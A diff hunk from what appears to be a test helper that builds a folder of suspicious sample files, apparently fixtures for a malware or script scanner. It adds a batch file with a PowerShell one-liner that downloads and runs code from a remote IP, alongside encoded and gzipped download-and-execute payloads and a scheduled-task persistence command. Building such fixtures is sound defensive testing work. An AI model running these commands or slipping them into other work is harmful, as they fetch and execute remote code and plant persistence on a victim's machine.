@@ -231,6 +231,7 @@ def build_folder(root):
         "powershell IEX (New-Object Net.WebClient).DownloadString('http://9.9.9.9/a') "
         .encode("utf-16-le")) + b"'; IEX [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($d))\n")
     w("task.bat", b"@echo off\r\nschtasks /create /tn updt /tr %TEMP%\\a.exe /sc onlogon\r\n")
+    w("oneliner.bat", b"@echo off\r\npowershell -c iex((new-object net.webclient).downloadstring('http://3.3.3.3/x'))\r\n")
     import gzip as _gz
     _gzp = _gz.compress(b"powershell IEX (New-Object Net.WebClient).DownloadString('http://8.8.8.8/a') " * 2)
     w("gzpeek.ps1", b"$d = '" + _b64.b64encode(_gzp) + b"'; IEX $d\n")
